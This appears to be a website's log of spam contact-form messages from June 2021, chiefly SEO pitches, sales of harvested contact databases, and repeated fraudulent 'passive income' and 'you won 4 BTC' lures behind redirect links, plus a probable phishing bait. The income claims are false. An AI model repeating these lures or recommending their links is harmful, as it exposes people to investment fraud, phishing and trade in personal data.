Contact Dale now: https://www.bark.com/find-work/united-states/plano-tx-75023/electricians/5c58da57/p38704998/

If you’d like any help with this, please call (424) 227-5323 (open 24 hours a day, 7 days a week) or email team@bark.com and we'll be happy to assist.

Many thanks, 
Andrew Good

If you don't want to hear from us again when new customers are looking for services in your area click here: https://www.bark.com/en/us/p-unsubscribe/LDnp29/2RlPBe/?x=1
+++ 2021-06-09 01:51:27 AM -- Email from: JamesAcemn, -- subject: &quot;Make your future bright!&quot; Invest $ 699 and get passive income of $ 6900 per day, -- email: am-khadija@hotmail.fr, -- Message is: Start acting right now! Invest $ 457 and get passive income of $ 8400 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Fd=Gu&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-09 04:04:42 PM -- Email from: Сloudhal, -- subject: Website Help., -- email: svidinfo1980@gmail.com, -- Message is: Hello, let me introduce you to our program. 
A program for fast website promotion. 
Result: 
- Your site is in the top of the search results. 
- The counter of visits grows before our eyes. 
- High scores on all indicators. 
- Earn money from advertising. 
The program has the ability to glue the sites of competitors to omit them in the search results. 
Learn more about the program. 
https://freetopfast.com/ 
download
+++ 2021-06-09 05:38:54 PM -- Email from: Floyd Luther, -- subject: Do you want lists of Millions of instant sales leads for your business?, -- email: luther.floyd@yahoo.com, -- Message is: Since 2012 Mailbanger.com has been selling marketing lists with customer name/contact information to many small and startup businesses.


we have lists for USA/UK/Australia/Canada and many more countries


Here are some of our packages:

USA Business database with executive contact info - Over 30 million records:
https://www.mailbanger.com/2020-usa-business-database-executive-edition/


2021 USA Homeowner and Residential – 248 million records:
https://www.mailbanger.com/2021-usa-homeowner-and-residential-248-million-records/



Cell/SMS Marketing package of over 20 million USA Customers:
https://www.mailbanger.com/usa-cell-phone-numbers


Monthly optin USA  sales leads (a fresh new package every month!):
https://www.mailbanger.com/monthly-usa-sales-leads


USA Charity donors:
https://www.mailbanger.com/usa-charity-donor-leads


850 000 Weight loss customers:
https://www.mailbanger.com/weight-loss-diet-leads-lists


we have many more lists - stop wasting thousands on pay per click or other expensive forms of advertising, and market direct for super affordable prices.

All lists are updated regularly, buy once and its yours so you can use them for many campaigns. They come in Excel files with sortable categories


Regards
Mailbanger.com
+++ 2021-06-10 03:21:35 AM -- Email from: Mike MacDonald, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Hello 
 
We will increase your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our services below, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike MacDonald
 
Speed SEO Digital Agency
+++ 2021-06-10 04:46:29 AM -- Email from: JamesAcemn, -- subject: For a comfortable life, you need to take just a couple of steps: Invest $ 586 and get passive income of $ 7900 per day, -- email: christophe.passefort@wanadoo.fr, -- Message is: The digital world: its advantages for revenue. Invest $ 668 and get passive income of $ 8700 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Hy=Sg&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-10 02:17:50 PM -- Email from: Modesta Olds, -- subject: Twitter Retweets, inside!, -- email: olds.modesta@gmail.com, -- Message is: Hey - esyray.com, 

Social Signals Marketing - Drive traffic to your website. And this is exactly why we're here! We have carefully developed a array of packages, including a well-that ratio of social signals in the most widely used social websites sites.
Check what we can do for you: 
https://seo-spesialists.com/socialsignals
Warm regards,
P.S. We offer the most effective marketing services you may order on our shop for making big money in a small business, still not considering getting clients? Here is a simple, 1-click unsubscribe link: https://seo-spesialists.com/?unsubscribe=esyray.com
+++ 2021-06-11 01:22:24 PM -- Email from: JamesAcemn, -- subject: Your account has received 4 BTC, urgently pick it up today, -- email: paplaydiop@yahoo.fr, -- Message is: You won 4 BTC, pick it up urgently today   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc2Ou0l&amp;sa=D&amp;Js=Kd&amp;usg=AFQjCNEqmEVL_8lT0s5VT1H9xJof7LQCIw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-11 03:09:37 PM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://voicebizreg.xyz/mroe-cusotmers/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voicebizreg.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-06-12 01:22:08 AM -- Email from: Layne Null, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: null.layne23@outlook.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-06-12 03:46:58 AM -- Email from: Kristie Moore, -- subject: Voice Search, -- email: kristie@business-directory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz.xyz/mroe-cusotmers/?=esyray.com


Kristie
Voice Activation Follow-up Specialist
Business Directory Link



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-06-12 08:00:54 PM -- Email from: Ahmed Stretton, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: stretton.ahmed@gmail.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-06-13 03:40:54 AM -- Email from: HaroldSop, -- subject: The story of a successful investment or how I turned $ 2100 into $ 11,520,850, -- email: trepyceline@orange.fr, -- Message is: Three months ago, when I came home from work, 
I was watching the evening news and there they were just interviewing a housewife from Paris (I don't remember her name anymore) 
who made a fortune by investing only $ 1500 in global automated trading systems (trading robots) without understanding anything in this thread. 
She named three automated trading systems on which she earned more than $ 30,000,000 in 7 months by investing only $ 1,500, that is, $ 500 in each system. 
I thought to myself why the hell are they showing this, because this is just an advertisement for some kind of trading system services and nothing more. 
And besides, if everything is so great with them, why show it on the news and tell others. But in the end I decided to give it a try. 
This news intrigued me, in the end I signed up, the manager called me, we set everything up, 
I invested $ 2100, $ 700 in each system and launched automated trading robots. For a whole week after the investment, 
I did not look at what was happening there, as there were a lot of things to do, but a week later when I opened my personal accounts in all three systems, 
I just silently opened my mouth and looked at my balance and wondered if I was sleeping because my passive income was quite is equal to $ 960,000! 
And in just three months my income was $ 11,520,850! 
To hell with everything, just take it and do it, if I succeed then you will certainly succeed. 
Here are my passive income and links to these three sites that made me a millionaire: 
1. Income $ 5,359,673 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc2JnE8&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFcvJhMW5sGMUv7j_-ItTr8aGwmaw 
2. Income $ 3,752,098 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1Jpgr&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFtc0f-Znle2hYDkjNlqovjfh5SnQ 
3. Income $ 2,409,079 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc2JnRF&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNE4usgK_TRXvziyBdhyHX5CrW7Szw
+++ 2021-06-13 04:40:33 PM -- Email from: Helene Goodenough, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: goodenough.helene@gmail.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-13 07:51:02 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-06-13 09:54:21 PM -- Email from: Ashlay Hazalton, -- subject: How to win casino by free bonus, -- email: ashlayhazalton36145@gmail.com, -- Message is: Hi, this is Chris. 
Who win all online casinos by using FREE BONUS. 
 
Witch mean, I don’t really spend money in online casinos. 
 
But I win every time, and actually, everybody can win by following my directions. 
 
even you can win! 
 
So, if you’re the person, who can listen to someone really smart, you should just try!! 
 
The best online casino, that I really recommend is, Vera&amp;John. 
Established in 2010 and became best online casino in the world. 
 
They give you free bonus when you charge more than $50. 
If you charge $50, your bonus is going to be $50. 
 
If you charge $500, you get $500 Free bonus. 
You can bet up to $1000. 
 
Just try roulette, poker, black jack…any games with dealers. 
Because dealers always have to make some to win and, only thing you need to do is to be chosen. 
 
Don’t ever spend your bonus at slot machines. 
YOU’RE GONNA LOSE YOUR MONEY!! 
 
Next time, I will let you know how to win in online casino against dealers!! 
 
Don’t forget to open your VERA&amp;JOHN account, otherwise you’re gonna miss even more chances!! 
 
 
 
Open Vera&amp;John account (free) 
https://bit.ly/3wZkpco
+++ 2021-06-14 12:35:07 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-06-15 04:37:21 AM -- Email from: Loretta Bullock, -- subject: Your Product, -- email: loretta@order-fulfillment.net, -- Message is: Hello from order-fulfillment.net,

Doing your own product shipping or order fulfillment in house?

Tired of it? Visit us on www.order-fulfillment.net  

We can store, inventory, and manage your drop shipping / order fulfillment for you.  

Based in the US for almost 2 decades - we ship around the world and will save you time and money.

Who would be the best contact at your company to discuss?

Here are some of the items we ship for clients:
-Books, training manuals, guides
-New member welcomes boxes and gifts
-Product samples
-Marketing materials
-Medical program test kits
-Follow up gifts to clients, leads, and prospects

Thank you!
Fulfillment Warehouse
https://order-fulfillment.net
+++ 2021-06-15 11:00:37 AM -- Email from: Yanira Tolbert, -- subject: , -- email: omaima.1919w@lokasur.com, -- Message is: Don't spend another dollar on advertising until you've seen this first: http://www.effective-and-free-advertising.xyz
+++ 2021-06-15 09:31:45 PM -- Email from: aspic, -- subject: I promised., -- email: baburovp@bk.ru, -- Message is: Hi, this is Anna. I am sending you my intimate photos as I promised. https://tinyurl.com/yj2gean8
+++ 2021-06-16 07:39:21 AM -- Email from: Jeffrey Mathews, -- subject: Hundreds of people look for businesses like yours on Google Maps., -- email: mathews.jeffrey@googlemail.com, -- Message is: Good evening 
I tried to find you on google maps, but I couldn't, so I've visited your website esyray.com and saw that you have some images that we can make use of so clients can find you locally.
Quality Backlinks to your websites from Geotagged Images is a new way local businesses get hundreds of clients daily. Learn how:
https://your-web-marketing.com/imagegeotagging
I know it will work.
Thanks!
Kind regards,
We offer the most effective IT services you can purchase on our online shop for making big money in a small business, still not enthusiastic about getting new customers? Here is an easy, 1-click unsubscribe link: https://your-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-06-16 07:47:11 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://voicebizreg.xyz/mroe-cusotmers/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voicebizreg.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-06-17 02:26:48 AM -- Email from: MatthewNon, -- subject: Download Music FLAC, -- email: principessaique@alice.it, -- Message is: Hello, 
 
Download high quality music: http://0daymusic.org/premium.php 
Label, LIVESETS, Music Videos, TV Series. 
Download Dance, Electro, House, Techno, Trance, Pop, Rock, Rap... 
 
Best regards, 
0day MP3s
+++ 2021-06-17 02:44:09 AM -- Email from: JamesAcemn, -- subject: For a comfortable life, you need to take just a couple of steps: Invest $ 360 and get passive income of $ 7400 per day, -- email: velangilot79@yahoo.fr, -- Message is: For a comfortable life, you need to take just a couple of steps: Invest $ 395 and get passive income of $ 5700 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;St=Hq&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-17 09:53:24 AM -- Email from: Joshua Penrod, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: penrod.joshua@gmail.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-17 12:54:32 PM -- Email from: Jude Atherton, -- subject: , -- email: ykumarrudra125s@pianoxltd.com, -- Message is: Online business that has zero overheads? Yep it's possible, check it out: http://bit.ly/affiliate-marketing-how-to-make-it-work
+++ 2021-06-17 04:32:39 PM -- Email from: Sandy Benton, -- subject: The Magic of 10,000 Instagram Followers, -- email: bentonsandy5@gmail.com, -- Message is: Hi there,

Do you know the magic of 10K Instagram followers?
The milestone comes with an immediate, tangible benefit. 

Once you have 10k followers, Instagram will make it easier for you to get people
to your website via Stories with the swipe up to link feature.

Swipe up is the only way to get a direct link from your Instagram to your other web properties. 
And, it’s available in STORIES, if you have 10k followers.

The swipeable link in stories lets you send people to your blog, your ecommerce page, or your email signup list, 
without requiring the visitor to click to your bio first. The feature alone is a game changer!

Testimonial:
“Before this, Instagram rarely showed up as a traffic source for my shop or blog. 
Since that feature was added, I’m able to get more traffic to my websites directly from IG.”

To order and see all other packages please go to https://social-media-blast.com

Kind regards,
Sandy B.
SMB
+++ 2021-06-17 09:15:18 PM -- Email from: Barbara Atyson, -- subject: Explainer Video for esyray.com, -- email: barbaratysonhw@yahoo.com, -- Message is: Hi,

We'd like to introduce to you our explainer video service which we feel can benefit your site esyray.com.

Check out some of our existing videos here:
https://www.youtube.com/watch?v=zvGF7uRfH04
https://www.youtube.com/watch?v=cZPsp217Iik
https://www.youtube.com/watch?v=JHfnqS2zpU8

All of our videos are in a similar animated format as the above examples and we have voice over artists with US/UK/Australian accents.

They can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video such as Youtube, and can be embedded into your website or featured on landing pages.

Our prices are as follows depending on video length:
1 minute = $239
1-2 minutes = $339
2-3 minutes = $449

*All prices above are in USD and include an engaging, and captivating video, full script and voice-over.

If this is something you would like to discuss further, don't hesitate to get in touch.
If you are not interested, simply delete this message and we won't contact you again.

Kind Regards,
Barbara
+++ 2021-06-18 06:07:45 AM -- Email from: Travishoact, -- subject: Mining farm for Chia coin, 60Tb and etc., -- email: reda102@msn.fr, -- Message is: Hey! We buy top-end video cards and mining equipment at closed auctions of customs confiscated. 
And we sell at once for 10 pieces in one order, at favorable prices both for you and for us. 
All equipment is brand new. We deliver worldwide within two weeks after payment of the order. 
If you are a miner or reseller, this is the perfect offer for you. 
At the moment we have in stock: Mining farm for Chia coin, 60Tb - 500 pieces and 
GIGABYTE NVIDIA GeForce RTX 3090, GV-N3090AORUS X-24GD, 24GB, GDDR6X - 1300 pieces. 
You can get acquainted with the assortment and prices here: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc30MFC&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNEKxorlqqm159Sm9cRk-7WfHI_FYA
+++ 2021-06-18 07:36:48 AM -- Email from: Thurman Brannon, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: brannon.thurman@gmail.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-18 02:15:25 PM -- Email from: Mike Becker, -- subject: affordable monthly SEO plans, -- email: no-reply@google.com, -- Message is: Howdy 
 
I have just took a look on your SEO for  esyray.com for its SEO Trend and saw that your website could use an upgrade. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Mike Becker
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-06-19 07:26:25 AM -- Email from: JamesAcemn, -- subject: The digital world: its advantages for revenue. Invest $ 367 and get passive income of $ 4900 per day, -- email: dennis.1994@orange.fr, -- Message is: For a comfortable life, you need to take just a couple of steps: Invest $ 695 and get passive income of $ 8700 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Mw=Mg&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-20 12:44:26 PM -- Email from: Jenna Nickson, -- subject: How to Get Everything You Want, In a Way which Helps the Whole World - Geshe Michael Roach, -- email: nickson.jenna@gmail.com, -- Message is: In his TEDx talk, he will share a teaching from the oldest printed book in the world—the Diamond Cutter Sutra—which helps us get everything we want in life, in a way which also helps the entire world. We will be learning an ancient method known as the Four Steps, which can be applied to five different goals: financial independence for the rest of our life; great personal and professional relationships; vibrant health and energy; a clear, happy, and focused mind—and most importantly, how we can use all these to find out why we came into this world, and how we can live a life of great purpose and meaning.

Geshe Michael Roach is a Princeton University graduate who spent 25 years in a Tibetan monastery and is the first American to be awarded the degree of Geshe, or Master of Buddhism. He utilized his monastery training to help build a major New York corporation which reached $250 million in annual sales, and was sold to super-investor Warren Buffett in 2009. Michael used a large portion of his business profits, and support from companies like Hewlett Packard, to found a 25-year effort to train and pay Tibetan refugees to input thousands of their endangered ancient books and make them available online for free.

We are not affiliated to Michael Roach in anyway. We are helping to spread his message to make this world a better place. Please share with your friends if you find this helpful.
Watch Geshe Michael Roach's TED talk here.
https://bit.ly/3znMgFe

Listen to the Diamond Cutter Sutra in English below in youtube:
https://bit.ly/3zpREYz
The Diamond Sutra - 
&quot;The Diamond That Cuts Through Illusion&quot;
A new translation In English by Alex Johnson
Read by Chris Johnys.
+++ 2021-06-20 04:04:47 PM -- Email from: Tammie Hitchcock, -- subject: Backlinks Generator - esyray.com, -- email: tammie.hitchcock@gmail.com, -- Message is: Good Afternoon 
This is the software the competition use , nor don’t want you to understand:
https://it-web-marketing.com/backlinks-generator
With best regards,
We offer the most effective IT services you can check on our shop for making big money in a small business, still not considering getting new clients? Here is a simple, 1-click unsubscribe link:  https://it-web-marketing.com/?unsubscribe=esyray.com
+++ 2021-06-20 09:53:40 PM -- Email from: Jay McDonald, -- subject: Introduction, -- email: jayson+m1@mysalesscripter.com, -- Message is: Dear Sir/Madam,

I'm sorry to trouble you. Would you be so kind as to tell me who is  accountable for lead generation and marketing for esyray.com and  exactly how I might  connect with them?

As a thank you for reading my message can I give you a completely free no strings attached fill in the blanks professional sales letter template. Just go to Mysalesscripter.com now.

I'm passionate about bringing tech usually reserved for big corporations to smaller, often family run, operations. 

Thank you.

With kind regards,

Jay McDonald
Jayson@Mysalesscripter.com

Sales Script Scribe at https://Mysalesscripter.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-06-21 01:00:14 AM -- Email from: Laverne Boland, -- subject: Website Submitter© - Re:For Management, -- email: laverne.boland@outlook.com, -- Message is: Good morning
Hope you’re great, and that customers are profitable. Please allow me to introduce to you this service that you may find useful for your business.
Minimize the time and costs to advertise your site with your Artificial Intelligence Website Submitter.
https://first-class-promo.com
Warm regards,
We offer the top marketing services you may find on our online shop for making big money in a small business, still not enthusiastic about getting new customers? Here is a quick, 1-click unsubscribe link: https://first-class-promo.com/?unsubscribe=esyray.com
+++ 2021-06-21 10:30:32 PM -- Email from: Heergo, -- subject: I promised., -- email: q0y54ovk@yahoo.com, -- Message is: Cryptocurrency rates are breaking records, which means you have the opportunity to make money on cryptocurrencies. Join our system and start making money with us. Go to system: https://tinyurl.com/yk428y8h
+++ 2021-06-22 12:56:12 AM -- Email from: Philipwak, -- subject: Register and be on a roll! Invest $ 688 and get passive income of $ 8500 per day, -- email: zknafien_00@orange.fr, -- Message is: How to be financially independent and stand firmly on your feet? Invest $ 557 and get passive income of $ 9500 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  http://www.google.com/url?q=http%3A%2F%2Fgo.tipirock4.com%2F0e42&amp;sa=D&amp;Me=Nt&amp;usg=AFQjCNFU9A-BJV6zo6zbiu_s4SpbUgqfZQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-22 01:35:32 AM -- Email from: Kendall Ewald, -- subject: silent-plug.com, -- email: kendall.ewald@googlemail.com, -- Message is: The plug welcomes you with a super discount of 15% on every product for a limited period of time! (Promo code: THEPLUG)

We offer the largest assortment of private databases! Such as: 

- The Largest collection of Linkedin Databases! 
- Forex Consumers (worldwide)
- Casino Consumers  (worldwide)
- Business Databases  (worldwide)
- Cryptocurrency consumers  (worldwide)
- many more..

And the best part of it! We are the only source you will ever need! We have the largest database on the market with the greatest prices and team. 

Visit us: https://silent-plug.com/
+++ 2021-06-22 10:03:40 AM -- Email from: Heergo, -- subject: I promised., -- email: um15y7gy@hotmail.com, -- Message is: Cryptocurrency rates are breaking records, which means you have the opportunity to make money on cryptocurrencies. Join our system and start making money with us. Go to system: https://katzr.net/8c1a47
